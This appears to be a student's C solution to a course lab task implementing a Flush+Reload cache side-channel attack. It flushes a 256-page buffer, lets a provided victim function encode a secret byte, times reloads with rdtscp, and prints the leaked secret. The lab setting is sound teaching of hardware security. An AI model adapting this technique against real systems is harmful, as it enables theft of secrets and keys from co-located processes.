#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>

#include "asm.h"
#include "libcrypto/crypto.h"


int main(int argc, char *argv[]) {
    char leaked_secret[secret_length + 1];
    memset(leaked_secret, 0, (secret_length + 1) * sizeof(char));

    // You need to properly set the following variables
    int CACHE_THRESHOLD = 180; // Should be easy once you do TASK 0
    int STRIDE = 4096;         // Page size is a common stride
    int ITERATIONS = 1000;     // You can adjust this for speed vs. accuracy
    int RELOADBUFFER_SIZE = 256 * 4096;
    unsigned char *reloadbuffer;

    /*
    * ================ TASK 1 ================
    *               FLUSH + RELOAD 
    * ========================================
    */

    reloadbuffer = mmap(NULL, RELOADBUFFER_SIZE, PROT_READ | PROT_WRITE,
                        MAP_ANON | MAP_PRIVATE, -1, 0);

    if (reloadbuffer == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    memset(reloadbuffer, 1, RELOADBUFFER_SIZE);

    fflush(stdout);

    for (int index = 0; index < secret_length; index++) {
        int scores[256] = {0};

        for (int iter = 0; iter < ITERATIONS; iter++) {
            // Flush all candidate cache lines.
            for (int i = 0; i < 256; i++) {
                clflush(&reloadbuffer[i * STRIDE]);
            }
            
            // Victim access encodes one byte into the cache.
            mfence();
            encrypt_secret_byte(reloadbuffer, STRIDE, index);

            // Reload each line and time it to find the cache hit.
            for (int i = 0; i < 256; i++) {
                uint64_t t1, t2;

                lfence();
                t1 = rdtscp();
                volatile unsigned char x = reloadbuffer[i * STRIDE];
                t2 = rdtscp();
                lfence();
                
                if ((t2 - t1) < CACHE_THRESHOLD) {
                    scores[i]++;
                }
            }
        }

        // Pick the byte value with the highest score.
        int best_val = 0;
        for (int i = 1; i < 256; i++) {
            if (scores[i] > scores[best_val]) {
                best_val = i;
            }
        }

        leaked_secret[index] = (char)best_val;
        printf("[byte %d] 0x%02x  '%c' (score=%d)\n", index, best_val,
               isprint(best_val) ? best_val : '.', scores[best_val]);
    }

    printf("\n[*] Leaked secret: ");
    
    for (int i = 0; i < secret_length; i++) {
        unsigned char c = leaked_secret[i];
        printf("%c", isprint(c) ? c : '.');
    }
    
    printf("\n\n");

    munmap(reloadbuffer, RELOADBUFFER_SIZE);
    return 0;
}